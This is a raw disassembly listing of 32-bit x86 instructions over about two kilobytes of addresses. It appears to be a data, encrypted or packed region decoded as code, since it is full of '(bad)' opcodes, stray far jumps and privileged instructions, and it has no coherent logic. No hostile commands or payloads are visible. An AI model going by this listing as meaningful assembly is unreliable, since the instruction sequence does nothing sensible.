  410e47:	or     BYTE PTR [edx-0x55],dl
  410e4a:	test   DWORD PTR [ecx+0x4b4290b4],0x2c3762cb
  410e54:	loope  0x410e21
  410e56:	pop    ebp
  410e57:	mov    BYTE PTR [edx],ch
  410e59:	inc    esi
  410e5a:	cmp    edx,ebp
  410e5c:	ficomp WORD PTR [edx]
  410e5e:	ss in  al,0x71
  410e61:	pop    ebp
  410e62:	daa    
  410e63:	push   cs
  410e64:	xchg   esi,eax
  410e65:	jmp    0x410e9b
  410e67:	retf   
  410e68:	add    eax,0x5a60e6ec
  410e6d:	das    
  410e6e:	jl     0x410e0d
  410e70:	fsubr  DWORD PTR [edi]
  410e72:	(bad)  
  410e73:	inc    eax
  410e74:	cmp    dh,BYTE PTR [ebp-0x25]
  410e77:	jb     0x410eba
  410e79:	lods   al,BYTE PTR ds:[esi]
  410e7a:	pop    es
  410e7b:	or     DWORD PTR [ebx],ecx
  410e7d:	or     esi,DWORD PTR [ebx+ebx*1-0x4cdae0d5]
  410e84:	scas   al,BYTE PTR es:[edi]
  410e85:	popa   
  410e86:	add    BYTE PTR [ecx+0x583b3af5],bl
  410e8c:	dec    ecx
  410e8d:	xchg   ebx,eax
  410e8e:	call   0x7963:0x6ecef803
  410e95:	jecxz  0x410e38
  410e97:	or     ah,BYTE PTR es:[ecx]
  410e9a:	pop    esp
  410e9b:	pop    eax
  410e9c:	mov    ecx,DWORD PTR [edi]
  410e9e:	adc    al,BYTE PTR [eax]
  410ea0:	xor    dh,0x5b
  410ea3:	leave  
  410ea4:	add    ecx,DWORD PTR [ecx+0x4010160b]
  410eaa:	jnp    0x410f26
  410eac:	loopne 0x410eff
  410eae:	push   eax
  410eaf:	jmp    0x3d39:0xa4a0c894
  410eb6:	mov    eax,0xec6d2194
  410ebb:	dec    ecx
  410ebc:	xor    DWORD PTR [edi-0x1f],esp
  410ebf:	out    0x66,eax
  410ec1:	scas   eax,DWORD PTR es:[edi]
  410ec2:	and    ecx,esp
  410ec4:	mov    ch,0xd9
  410ec6:	mov    cl,0xcf
  410ec8:	std    
  410ec9:	lods   al,BYTE PTR ds:[esi]
  410eca:	repz pop edi
  410ecc:	retf   0x8702
  410ecf:	jo     0x410e7a
  410ed1:	(bad)  
  410ed2:	sub    eax,DWORD PTR [ebp+0x25bd4cef]
  410ed8:	hlt    
  410ed9:	(bad)  
  410eda:	(bad)  
  410edb:	je     0xffd66809
  410ee1:	jb     0x410f5c
  410ee3:	dec    esp
  410ee4:	mov    ch,0x2
  410ee6:	in     eax,0x21
  410ee8:	xor    DWORD PTR [edx-0x5e48db39],ecx
  410eee:	jle    0x410f1c
  410ef0:	cmp    ch,al
  410ef2:	mov    eax,0xfdae789e
  410ef7:	retf   
  410ef8:	or     bh,ch
  410efa:	cs cmp ecx,ebx
  410efd:	ja     0x410eb2
  410eff:	pop    esi
  410f00:	mov    ah,cl
  410f02:	pop    ss
  410f03:	sbb    BYTE PTR [ebx+0x49e16440],al
  410f09:	aad    0x89
  410f0b:	cdq    
  410f0c:	icebp  
  410f0d:	inc    esp
  410f0e:	sbb    al,0xe
  410f10:	test   DWORD PTR [ecx+ebp*8-0xc],0x5ea005a5
  410f18:	jecxz  0x410f0f
  410f1a:	stos   BYTE PTR es:[edi],al
  410f1b:	or     BYTE PTR [eax+0xb],cl
  410f1e:	sbb    DWORD PTR [eax+0x17d49eb3],0x10
  410f25:	jl     0x410f1c
  410f27:	test   al,0x67
  410f29:	pop    ecx
  410f2a:	fsub   DWORD PTR [ecx+0x311be45a]
  410f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f31:	rcr    ebx,cl
  410f33:	mov    DWORD PTR [edi+0x30],0xc5377cd8
  410f3a:	ret    
  410f3b:	into   
  410f3c:	sub    DWORD PTR [edi],ebx
  410f3e:	mov    eax,ds:0xe9b046d0
  410f43:	push   ds
  410f44:	scas   al,BYTE PTR es:[edi]
  410f45:	out    0x60,al
  410f47:	ret    0xc1dd
  410f4a:	mov    ecx,es
  410f4c:	dec    esp
  410f4d:	jg     0x410f1c
  410f4f:	popf   
  410f50:	(bad)  
  410f51:	ds int 0x4e
  410f54:	xchg   ebx,eax
  410f55:	or     DWORD PTR [ebp-0x68],0x67
  410f59:	inc    ebp
  410f5a:	and    BYTE PTR [edx-0x34],dl
  410f5d:	jb     0x410f34
  410f5f:	sbb    BYTE PTR [ebp+0x28],cl
  410f62:	xchg   esi,eax
  410f63:	(bad)  
  410f64:	cli    
  410f65:	push   esp
  410f66:	fwait
  410f67:	sbb    BYTE PTR [ebp-0x63a4b114],bl
  410f6d:	enter  0x4ae1,0x29
  410f71:	fdiv   QWORD PTR ds:0x78e4844e
  410f77:	sub    eax,0x1391a48c
  410f7c:	mov    BYTE PTR [edx],dh
  410f7e:	arpl   WORD PTR [esi+esi*2+0x39b524e1],bx
  410f85:	mov    esp,0xb382276d
  410f8a:	xor    eax,0x800f817b
  410f8f:	call   0xee851a66
  410f94:	das    
  410f95:	adc    eax,0x20785b6b
  410f9a:	aas    
  410f9b:	jecxz  0x410f20
  410f9d:	sub    DWORD PTR [eax],ebx
  410f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fa0:	lds    edi,FWORD PTR [esi-0xebd4613]
  410fa6:	pop    esi
  410fa7:	std    
  410fa8:	sbb    edx,DWORD PTR [eax+0x1af8520c]
  410fae:	cdq    
  410faf:	fs or  ebp,edx
  410fb2:	stc    
  410fb3:	sahf   
  410fb4:	ret    
  410fb5:	mov    WORD PTR [edi+0x21edadf],cs
  410fbb:	push   ecx
  410fbc:	lea    esp,[ebx]
  410fbe:	retw   0xa41b
  410fc2:	jne    0x410f57
  410fc4:	and    DWORD PTR [esp+ebx*8],eax
  410fc7:	xchg   esp,eax
  410fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fc9:	fisub  WORD PTR [esp+eax*1]
  410fcc:	xchg   edi,eax
  410fcd:	cmp    ch,0x3
  410fd0:	sbb    al,0xfe
  410fd2:	rcr    esi,1
  410fd4:	mov    cl,0x92
  410fd6:	xor    BYTE PTR [ebx+0x3143e6e6],dh
  410fdc:	add    ch,BYTE PTR [ecx]
  410fde:	shl    BYTE PTR [ebp+0x58],cl
  410fe1:	sub    eax,0x32ccd7b3
  410fe6:	mov    eax,0x136c19e2
  410feb:	jo     0x410f9b
  410fed:	adc    ah,BYTE PTR [ebp+esi*4-0x43]
  410ff1:	sahf   
  410ff2:	ror    BYTE PTR [edx+0x6c75d499],1
  410ff8:	loopne 0x411024
  410ffa:	pop    ebx
  410ffb:	das    
  410ffc:	cs xchg edi,eax
  410ffe:	loop   0x410f8f
  411000:	cmp    al,0xb7
  411002:	fadd   DWORD PTR [ebx+0x71]
  411005:	mov    bl,dl
  411007:	idiv   DWORD PTR [esi]
  411009:	mov    ah,0x41
  41100b:	or     edx,edx
  41100d:	shl    DWORD PTR [eax],0xe7
  411010:	adc    ecx,DWORD PTR [esp+edx*1+0x305ba93c]
  411017:	mov    ebx,0xb4cca523
  41101c:	jbe    0x410ff3
  41101e:	adc    al,0x59
  411020:	shl    BYTE PTR [ecx+0x68],0x98
  411024:	pop    eax
  411025:	jb     0x411054
  411027:	scas   al,BYTE PTR es:[edi]
  411028:	jb     0x410fb7
  41102a:	lahf   
  41102b:	pop    ds
  41102c:	(bad)  
  41102d:	call   0xf90cd629
  411032:	lods   eax,DWORD PTR ds:[esi]
  411033:	jae    0x410feb
  411035:	or     BYTE PTR [ecx+0x44],0x7a
  411039:	shl    DWORD PTR [esi+0x2a043b85],0x89
  411040:	jmp    0x41106d
  411042:	add    DWORD PTR [ebp+0x2a],ebx
  411045:	(bad)  
  411047:	retf   
  411048:	imul   esi,esi,0xffffff9b
  41104b:	xchg   ebx,eax
  41104c:	mov    eax,ds:0x823971f6
  411052:	imul   eax,DWORD PTR [edx],0x65
  411055:	cld    
  411056:	push   eax
  411057:	pop    esi
  411058:	gs xchg esi,eax
  41105a:	nop
  41105b:	loop   0x410ff1
  41105d:	inc    ebx
  41105e:	pop    ds
  41105f:	shr    BYTE PTR [eax-0x3d2df38f],cl
  411065:	mov    edx,esi
  411067:	stos   BYTE PTR es:[edi],al
  411068:	test   DWORD PTR [edi],0x91d60aca
  41106e:	(bad)  [ebp+0x61c2bbbc]
  411074:	adc    DWORD PTR [eax-0x592a5e75],ecx
  41107a:	or     ebp,DWORD PTR [edi-0x3e3955ff]
  411080:	in     eax,0x8d
  411082:	or     DWORD PTR [ebp+0x50474d6c],0x1d
  411089:	loop   0x411067
  41108b:	(bad)  
  41108d:	(bad)  
  41108e:	push   cs
  41108f:	pop    esi
  411090:	test   eax,0x467b9245
  411095:	or     al,0x79
  411097:	add    dl,BYTE PTR ds:0x3c4b8ec4
  41109d:	addr16 out dx,eax
  41109f:	sbb    DWORD PTR [eax],esi
  4110a1:	push   ds
  4110a2:	gs xchg ecx,eax
  4110a4:	icebp  
  4110a5:	xchg   ebx,eax
  4110a6:	bound  esp,QWORD PTR [edx-0x35]
  4110a9:	icebp  
  4110aa:	sub    esp,DWORD PTR [esp+esi*4-0x4416a069]
  4110b1:	outs   dx,DWORD PTR ds:[esi]
  4110b2:	mov    edi,0x37364abf
  4110b7:	cli    
  4110b8:	test   al,0xb2
  4110ba:	mov    ebp,0xf979b9bf
  4110bf:	push   DWORD PTR [edi+0x41472d2d]
  4110c5:	pop    ebx
  4110c6:	inc    BYTE PTR [ebx]
  4110c8:	sub    BYTE PTR [eax],0x6a
  4110cb:	inc    edx
  4110cc:	mov    al,0xdc
  4110ce:	aad    0xcb
  4110d0:	das    
  4110d1:	fidivr DWORD PTR [edx+esi*1-0x75ef1ff3]
  4110d8:	inc    esp
  4110d9:	or     BYTE PTR [ecx+eiz*8-0x41],0xf9
  4110de:	xor    dh,al
  4110e0:	jae    0x411088
  4110e2:	outs   dx,BYTE PTR ds:[esi]
  4110e3:	cmp    eax,0xa2b5751b
  4110e8:	add    BYTE PTR [edx-0x4e],cl
  4110eb:	es js  0x4110c9
  4110ee:	icebp  
  4110ef:	sbb    BYTE PTR [eax+0x43],dh
  4110f2:	bound  edi,QWORD PTR [ebp-0x5c4173d6]
  4110f8:	loop   0x41109e
  4110fa:	(bad)  
  4110fb:	addr16 pusha 
  4110fd:	popa   
  4110fe:	mov    bh,0x4f
  411100:	fwait
  411101:	loop   0x41117c
  411103:	out    dx,al
  411104:	ins    BYTE PTR es:[edi],dx
  411105:	xchg   edx,eax
  411106:	lds    ebx,FWORD PTR ds:0x5f9bcc9d
  41110c:	out    0xe3,al
  41110e:	ss add eax,0x64a12b09
  411114:	sbb    cl,dh
  411116:	pop    ecx
  411117:	xchg   edx,eax
  411118:	cmc    
  411119:	sub    BYTE PTR cs:[esi],cl
  41111c:	retf   
  41111d:	mov    ebp,0x65c7eef6
  411122:	pop    ebx
  411123:	dec    eax
  411124:	clc    
  411125:	adc    DWORD PTR [edx],edi
  411127:	dec    ebp
  411128:	inc    WORD PTR [bp-0x557b]
  41112e:	mov    ah,0xf0
  411130:	data16 sub BYTE PTR [edi],cl
  411133:	shr    BYTE PTR [ecx+esi*4],1
  411136:	cmp    cl,BYTE PTR [ecx-0x7e]
  411139:	sbb    BYTE PTR [eax-0x327d8259],bh
  41113f:	push   ecx
  411140:	imul   edx,DWORD PTR [edi-0x3b5fced5],0x6bc9b72b
  41114a:	in     al,0x6b
  41114c:	jl     0x411130
  41114e:	dec    esp
  41114f:	mov    ds:0x36755f12,eax
  411154:	and    eax,0xaa1095a6
  411159:	mov    ?,cx
  41115c:	mov    WORD PTR [ecx-0x38],ss
  41115f:	dec    edx
  411160:	cwde   
  411161:	imul   edx,DWORD PTR [edx-0x40],0xffffffe3
  411165:	dec    esp
  411166:	loopne 0x411195
  411168:	xor    eax,0xbb6db2
  41116d:	std    
  41116e:	cld    
  41116f:	mov    bl,0xea
  411171:	jnp    0x41111c
  411173:	mov    ecx,0x6abbcfc8
  411178:	ja     0x411151
  41117a:	mov    dh,BYTE PTR [esi]
  41117c:	pop    edi
  41117d:	mov    edi,ebp
  41117f:	adc    bl,BYTE PTR [ecx+0x6738f705]
  411185:	sahf   
  411186:	clc    
  411187:	loop   0x4111c5
  411189:	push   ebx
  41118a:	mov    ch,0x6e
  41118c:	mov    cl,dl
  41118e:	push   edi
  41118f:	sbb    BYTE PTR [edx+0x1ae69329],al
  411195:	pop    esp
  411196:	lods   al,BYTE PTR ds:[esi]
  411197:	leave  
  411198:	sbb    eax,0x44c6cda
  41119d:	xchg   esi,eax
  41119e:	mov    edx,0x26dffe75
  4111a3:	hlt    
  4111a4:	iret   
  4111a5:	xor    eax,DWORD PTR [eax-0x41cddce7]
  4111ab:	mov    dl,0xb5
  4111ad:	and    eax,0x1d65fb63
  4111b2:	mov    bh,BYTE PTR [eax-0x4c]
  4111b5:	jae    0x4111f9
  4111b7:	pop    eax
  4111b8:	inc    eax
  4111b9:	xor    al,0xfb
  4111bb:	cdq    
  4111bc:	(bad)  
  4111bd:	fcomp  QWORD PTR [eax+ecx*1-0x7c]
  4111c1:	retf   0x4270
  4111c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111c5:	add    ecx,edx
  4111c7:	imul   eax,DWORD PTR [eax+0xc5b9479],0x947dcb87
  4111d1:	mov    es,ebp
  4111d3:	cmp    ah,BYTE PTR [ebp+0x18e338b0]
  4111d9:	pop    edx
  4111da:	imul   ebp,DWORD PTR es:[ebx+0x2f],0x92e96fba
  4111e2:	rep lods al,BYTE PTR ds:[esi]
  4111e4:	ja     0x4111b8
  4111e6:	jae    0x411189
  4111e8:	imul   edx,DWORD PTR [esi-0x5f],0xc
  4111ec:	lds    edx,FWORD PTR [ebx]
  4111ee:	iret   
  4111ef:	rol    DWORD PTR [ecx-0x737c4c45],0xcf
  4111f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111f7:	test   BYTE PTR [eax],cl
  4111f9:	add    ecx,DWORD PTR [edi]
  4111fb:	sub    al,0xfe
  4111fd:	mov    al,ds:0x3d5a69a2
  411202:	mov    WORD PTR [eax],?
  411204:	mov    dh,0x9b
  411206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411207:	inc    edx
  411208:	mov    ebx,esi
  41120a:	addr16 add ch,dl
  41120d:	sub    al,0x8a
  41120f:	ins    DWORD PTR es:[edi],dx
  411210:	mov    eax,0xae621422
  411215:	and    al,0xc2
  411217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411218:	ret    
  411219:	and    al,0x6
  41121b:	(bad)
  41121f:	mov    cl,0xd
  411221:	or     esp,edi
  411223:	jmp    0xaa4196c8
  411228:	push   esp
  411229:	fistp  QWORD PTR [edi+0x54afb446]
  41122f:	adc    ebx,DWORD PTR [esi+0x72029c71]
  411235:	in     eax,0xc6
  411237:	sub    ebp,DWORD PTR ds:0xb8be5598
  41123d:	jmp    0x411221
  41123f:	sub    al,0xda
  411241:	mov    esi,0x55b182cf
  411246:	ja     0x411275
  411248:	aam    0x22
  41124a:	mov    ebp,0x2dd5c601
  41124f:	xchg   esi,eax
  411250:	clc    
  411251:	and    dh,ch
  411253:	add    esi,DWORD PTR ds:0x4ebc29da
  411259:	stos   DWORD PTR es:[edi],eax
  41125a:	loop   0x411292
  41125c:	sti    
  41125d:	out    dx,al
  41125e:	xor    DWORD PTR [eax],ebx
  411260:	fwait
  411261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411262:	repnz fild WORD PTR [esi+0x10]
  411266:	(bad)  
  411267:	mov    edx,0x3a7e9a14
  41126c:	sbb    ax,0x55e3
  411270:	in     al,0x6
  411272:	cmp    BYTE PTR [edx],0xa3
  411275:	pop    ecx
  411276:	test   al,0x94
  411278:	pusha  
  411279:	fiadd  WORD PTR [ecx]
  41127b:	add    al,0x5c
  41127d:	and    ah,BYTE PTR [eax-0x5b]
  411280:	es push ds
  411282:	js     0x4112d0
  411284:	cmp    BYTE PTR [edi],0x6a
  411287:	inc    ebx
  411288:	push   esp
  411289:	sub    DWORD PTR [edx-0x6b85a4c5],ebp
  41128f:	inc    bh
  411291:	push   cs
  411292:	pop    edi
  411293:	and    edi,ebp
  411295:	test   BYTE PTR [eax+0x37],ah
  411298:	push   edx
  411299:	lock and eax,0x8d3aac5e
  41129f:	push   cs
  4112a0:	ja     0x411267
  4112a2:	push   0xb
  4112a4:	push   0x7da416fe
  4112a9:	mov    bh,0x5f
  4112ab:	scas   eax,DWORD PTR es:[edi]
  4112ac:	stc    
  4112ad:	cmp    al,BYTE PTR [edx+0x5762ed94]
  4112b3:	push   DWORD PTR [edx-0x6b]
  4112b6:	jno    0x4112a4
  4112b8:	push   es
  4112b9:	stos   BYTE PTR es:[edi],al
  4112ba:	push   esi
  4112bb:	popf   
  4112bc:	jno    0x411273
  4112be:	adc    BYTE PTR [ebx],cl
  4112c0:	xchg   edi,eax
  4112c1:	cs xchg edx,eax
  4112c3:	test   DWORD PTR [edi+0x1c6217dc],0x14d9e066
  4112cd:	and    DWORD PTR [esi],ebp
  4112cf:	arpl   WORD PTR [eax-0x34a2916c],ax
  4112d5:	rcl    DWORD PTR [edx-0x121a5d0b],0xea
  4112dc:	je     0x41126d
  4112de:	adc    al,BYTE PTR [ecx]
  4112e0:	icebp  
  4112e1:	jbe    0x411336
  4112e3:	mov    esi,0x34fb6512
  4112e8:	xlat   BYTE PTR ds:[ebx]
  4112e9:	adc    esi,edi
  4112eb:	inc    ebp
  4112ec:	inc    edi
  4112ed:	ins    BYTE PTR es:[edi],dx
  4112ee:	inc    esi
  4112ef:	mov    cl,0x65
  4112f1:	add    eax,edi
  4112f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	sbb    DWORD PTR [edx],esi
  4112f7:	cmp    BYTE PTR [esi+edx*4+0x3b],al
  4112fb:	std    
  4112fc:	sbb    ebx,DWORD PTR [eax+eax*2]
  4112ff:	icebp  
  411300:	retfw  
  411302:	mov    ecx,0x9d4dc1a7
  411307:	push   edi
  411308:	xor    ah,BYTE PTR [ecx+0x53cba648]
  41130e:	xor    DWORD PTR [eax+0x29b656b1],esi
  411314:	jle    0x411303
  411316:	pop    edi
  411317:	nop
  411318:	xor    bh,dl
  41131a:	cmp    esi,DWORD PTR [esi-0x3180b152]
  411320:	lods   eax,DWORD PTR ds:[esi]
  411321:	push   ds
  411322:	mov    edx,0xc2f09007
  411327:	test   bh,dl
  411329:	lods   eax,DWORD PTR ds:[esi]
  41132a:	push   0x86df8803
  41132f:	cmc    
  411330:	sub    edi,esi
  411332:	xor    BYTE PTR [ecx+0x5c],dl
  411335:	ins    DWORD PTR es:[edi],dx
  411336:	hlt    
  411337:	pop    esp
  411338:	pop    es
  411339:	repnz mov ds:0xb9c117b0,eax
  41133f:	(bad)  
  411340:	aas    
  411341:	leave  
  411342:	clc    
  411343:	inc    eax
  411344:	(bad)  
  411345:	push   0xffffff8a
  411347:	(bad)  
  411349:	(bad)  
  41134a:	xor    ebx,eax
  41134c:	dec    edx
  41134d:	jmp    0x4a39:0x5be7f935
  411354:	mov    cl,dl
  411356:	and    dh,BYTE PTR [ebp+0x6d35fd00]
  41135c:	cld    
  41135d:	push   es
  41135e:	cmp    edi,ecx
  411360:	call   0xb489:0x801d787a
  411367:	jb     0x4113ab
  411369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41136a:	cdq    
  41136b:	xchg   esi,eax
  41136c:	sbb    dl,dh
  41136e:	sbb    BYTE PTR [edx],ch
  411370:	and    al,0xfd
  411372:	call   0x8967:0x43db0af2
  411379:	or     ebp,esp
  41137b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41137c:	imul   edi,DWORD PTR [edi],0xf54572c2
  411382:	sub    ecx,DWORD PTR [edi+0x7a68de9e]
  411388:	adc    ch,BYTE PTR [eax-0x211efe4c]
  41138e:	sbb    eax,0xac718296
  411393:	mov    eax,0x27fd593
  411398:	or     al,0x4
  41139a:	jno    0x411373
  41139c:	(bad)  
  41139d:	xchg   dh,dl
  41139f:	ficom  WORD PTR [ebp+0x649ec946]
  4113a5:	xchg   edx,eax
  4113a6:	lods   al,BYTE PTR ds:[esi]
  4113a7:	push   cs
  4113a8:	ss fwait
  4113aa:	adc    BYTE PTR [ecx+0x54],bh
  4113ad:	pop    eax
  4113ae:	shr    ch,0xab
  4113b1:	pop    esp
  4113b2:	fiadd  WORD PTR [ebp-0x63f13c6f]
  4113b8:	je     0x4113d2
  4113ba:	sahf   
  4113bb:	mov    cl,0xfb
  4113bd:	leave  
  4113be:	pop    ds
  4113bf:	popa   
  4113c0:	dec    ecx
  4113c1:	scas   eax,DWORD PTR es:[edi]
  4113c2:	xchg   edi,eax
  4113c3:	or     BYTE PTR [ecx-0x61a9018],dl
  4113c9:	jbe    0x4113c7
  4113cb:	jle    0x411371
  4113cd:	lock xchg ebx,eax
  4113cf:	test   eax,0xe9ac9201
  4113d4:	sub    BYTE PTR [eax],ch
  4113d6:	and    ch,dl
  4113d8:	and    al,0x9c
  4113da:	popf   
  4113db:	into   
  4113dc:	jl     0x41142c
  4113de:	push   ecx
  4113df:	sbb    al,0xc7
  4113e1:	scas   eax,DWORD PTR es:[edi]
  4113e2:	jmp    0x411447
  4113e4:	adc    DWORD PTR [esi+0x31b4c5d6],eax
  4113ea:	inc    edi
  4113eb:	cwde   
  4113ec:	pop    ss
  4113ed:	inc    edi
  4113ee:	push   es
  4113ef:	imul   esi,DWORD PTR [ecx+0x8427be3],0x72fc69ca
  4113f9:	dec    edx
  4113fa:	xchg   ebp,eax
  4113fb:	fisttp DWORD PTR [edi-0x7f]
  4113fe:	ins    DWORD PTR es:[edi],dx
  4113ff:	(bad)  
  411400:	imul   edx,DWORD PTR [edx-0x53c2e625],0x1c
  411407:	aas    
  411408:	call   0x400e998e
  41140d:	(bad)  [ecx+0x16]
  411410:	adc    DWORD PTR [esp+edi*2-0x23],ebp
  411414:	mov    ah,0x87
  411416:	inc    edx
  411417:	std    
  411418:	test   al,0x70
  41141a:	jb     0x4113ae
  41141c:	cmc    
  41141d:	add    ecx,DWORD PTR [esi+0x76]
  411420:	lods   al,BYTE PTR ds:[esi]
  411421:	mov    cl,0x0
  411423:	retf   0x1653
  411426:	arpl   WORD PTR [eax],bp
  411428:	int    0xc2
  41142a:	or     al,0x4a
  41142c:	or     al,0x2a
  41142e:	call   0xa62f:0xbec74951
  411435:	cli    
  411436:	inc    ecx
  411437:	lods   eax,DWORD PTR ds:[esi]
  411438:	in     al,dx
  411439:	push   ecx
  41143a:	pushf  
  41143b:	add    al,BYTE PTR [edi+0x6cfef766]
  411441:	mov    esi,0xea318d9b
  411446:	or     DWORD PTR [ebp+0x760fbf96],edi
  41144c:	scas   eax,DWORD PTR es:[edi]
  41144d:	jae    0x411462
  41144f:	(bad)  
  411450:	outs   dx,DWORD PTR ds:[esi]
  411451:	dec    DWORD PTR [eax-0x70bcce7f]
  411457:	cld    
  411458:	wrmsr  
  41145a:	mov    ds:0x86c01bd7,eax
  41145f:	fidiv  WORD PTR [ecx]
  411461:	les    eax,FWORD PTR ds:0xe0dd0493
  411467:	repz aaa 
  411469:	and    eax,0xfb787be0
  41146e:	in     al,0x8f
  411470:	xor    BYTE PTR [eax-0xb9b3fbe],ch
  411476:	xor    ebp,DWORD PTR [ebx]
  411478:	cld    
  411479:	leave  
  41147a:	sub    eax,0x6d981e4a
  41147f:	mov    dl,0xf2
  411481:	fsubr  QWORD PTR [edx]
  411483:	adc    DWORD PTR gs:[ecx-0x5d],esp
  411487:	pop    ds
  411488:	jl     0x4114a4
  41148a:	sub    DWORD PTR [ebx],0x76
  41148d:	leave  
  41148e:	les    esi,FWORD PTR [esi]
  411490:	dec    edi
  411491:	inc    ebx
  411492:	(bad)  
  411494:	aaa    
  411495:	sbb    eax,0xd3be
	...
  411512:	add    BYTE PTR [eax],al
  411514:	cmp    al,0xe5
  411516:	mov    esi,0xbf7fff35
  41151b:	in     eax,dx
  41151c:	mov    ecx,0x1f8896da
  411521:	sub    esi,ebx
  411523:	dec    esp
  411524:	cmp    eax,0x6c0000bf
  411529:	pop    es
  41152a:	add    BYTE PTR [eax],al
  41152c:	xchg   DWORD PTR [eax-0x48],edx
  41152f:	out    0x66,al
  411531:	mov    eax,ds:0xe08dff62
  411536:	sbb    ebx,esi
  411538:	pop    ebx
  411539:	retf   
  41153a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41153b:	addr16 out 0x51,eax
  41153e:	cli    
  41153f:	scas   eax,DWORD PTR es:[edi]
  411540:	iret   
  411541:	xchg   esi,eax
  411542:	lds    esi,FWORD PTR [ebx+esi*1]
  411545:	push   ecx
  411546:	and    al,0x8d
  411548:	loop   0x411597
  41154a:	sti    
  41154b:	push   ebp
  41154c:	fnclex 
  41154e:	inc    ecx
  41154f:	fsubr  DWORD PTR [edx+ecx*1]
  411552:	xor    dl,0x67
  411555:	push   ebp
  411556:	xor    eax,0xcef0321d
  41155b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41155c:	lahf   
  41155d:	jg     0x411548
  41155f:	pop    esp
  411560:	push   ss
  411561:	std    
  411562:	dec    ebx
  411563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411564:	cli    
  411565:	add    eax,0xaa304b5d
  41156a:	cmp    cl,ch
  41156c:	inc    eax
  41156d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41156e:	jnp    0x4114f9
  411570:	ins    DWORD PTR es:[edi],dx
  411571:	push   esp
  411572:	sbb    al,0x46
  411574:	cli    
  411575:	loop   0x4114f9
  411577:	xor    BYTE PTR [esi+0x2],0xc9
  41157b:	jg     0x411552
  41157d:	push   ecx
  41157e:	or     ah,BYTE PTR [ebx-0x3d]
  411581:	mov    ds,WORD PTR ds:0x4bf4dc93
  411587:	xor    al,0x68
  411589:	xchg   ecx,eax
  41158a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41158b:	push   es
  41158c:	loop   0x4115cf
  41158e:	inc    esi
  41158f:	xchg   edi,eax
  411590:	int3   
  411591:	sbb    eax,0x1ae79707
  411596:	xor    al,0x81
  411598:	test   DWORD PTR es:[ebp-0x15],eax
  41159c:	push   ebp
  41159d:	loopne 0x41152b
  41159f:	cli    
  4115a0:	popf   
  4115a1:	xor    dl,0x5c
  4115a4:	cs inc esi
  4115a6:	xchg   BYTE PTR [edx+0x44],ch
  4115a9:	jge    0x411547
  4115ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115ac:	sbb    al,0xd8
  4115ae:	iret   
  4115af:	lds    ebx,FWORD PTR [edi-0x6f597d46]
  4115b5:	jb     0x41155f
  4115b7:	cwde   
  4115b8:	shr    edx,1
  4115ba:	stc    
  4115bb:	ja     0x4115d4
  4115bd:	xor    DWORD PTR [ebp+0x3a5747c5],esp
  4115c3:	xchg   ecx,eax
  4115c4:	sub    dh,BYTE PTR [edx]
  4115c6:	dec    ecx
  4115c7:	and    DWORD PTR [esi-0x4d],esp
  4115ca:	gs mov bl,0x99
  4115cd:	jg     0x411626
  4115cf:	cmp    BYTE PTR [ecx],0x71
  4115d2:	mov    edx,ebx
  4115d4:	mov    edi,?
  4115d6:	imul   ebp,DWORD PTR [esi+0x9],0x7a7de27a
  4115dd:	or     DWORD PTR [eax+0x5c],ebx
  4115e0:	mov    ch,BYTE PTR [ebp-0x50793e24]
  4115e6:	cmc    
  4115e7:	fld    QWORD PTR [esi+0x7]
  4115ea:	arpl   WORD PTR [edi],di
  4115ec:	xchg   ebx,eax
  4115ed:	pop    esi
  4115ee:	das    
  4115ef:	jo     0x4115dd
  4115f1:	mov    esi,0x729dc29c
  4115f6:	les    edi,FWORD PTR [ebx]
  4115f8:	mov    dl,0x7d
  4115fa:	repnz cdq 
  4115fc:	mov    ds:0xe842fd0c,al
  411601:	jno    0x41162e
  411603:	mov    dh,0x5
  411605:	xlat   BYTE PTR ds:[ebx]
  411606:	xor    eax,0x114489b4
  41160b:	in     al,0xbe
  41160d:	aas    
  41160e:	push   eax
  41160f:	dec    esi
  411610:	bound  esp,QWORD PTR [edx+0x11]
  411613:	sbb    BYTE PTR [edx+0x78],cl
  411616:	dec    ebx
  411617:	ror    al,1
  411619:	xor    BYTE PTR [edx],0xa3
  41161c:	xor    al,0x64
  41161e:	sar    BYTE PTR [ecx-0x16],1
  411621:	call   FWORD PTR [edx-0x10ace9d0]
  411627:	cmp    eax,0xe95e0c1b
  41162c:	mov    ebx,0xcb579d52
  411631:	ins    BYTE PTR es:[edi],dx
  411632:	jo     0x41163f
  411634:	pusha  
  411635:	pop    ecx
  411636:	popa   
  411637:	scas   al,BYTE PTR es:[edi]
  411638:	test   al,0xcc
  41163a:	pop    ds
  41163b:	cld    
  41163c:	sti    
  41163d:	xor    DWORD PTR [esi+ecx*8],esp
  411640:	mov    edi,DWORD PTR ds:0x55fc600c
  411646:	add    ecx,DWORD PTR [ecx+0x1f47d104]
  41164c:	loope  0x4116a2
  41164e:	pop    esp
  41164f:	pop    es
  411650:	inc    ecx
  411651:	push   esi
  411652:	call   0xcb342ffd
  411657:	fmul   DWORD PTR [esi]
  411659:	in     al,0x7a
  41165b:	inc    esp
  41165c:	(bad)  [eax-0x2995accf]
  411662:	test   DWORD PTR [ecx-0x25678d5c],esp
  411668:	pushf  
  411669:	test   BYTE PTR [eax-0x97fd246],bh
  41166f:	xor    al,0x8b
  411671:	data16 je 0x4116bf
  411674:	and    ecx,DWORD PTR [ebx+0x332e4984]
  41167a:	jp     0x411687
  41167c:	jns    0x41165f
  41167e:	pop    edx
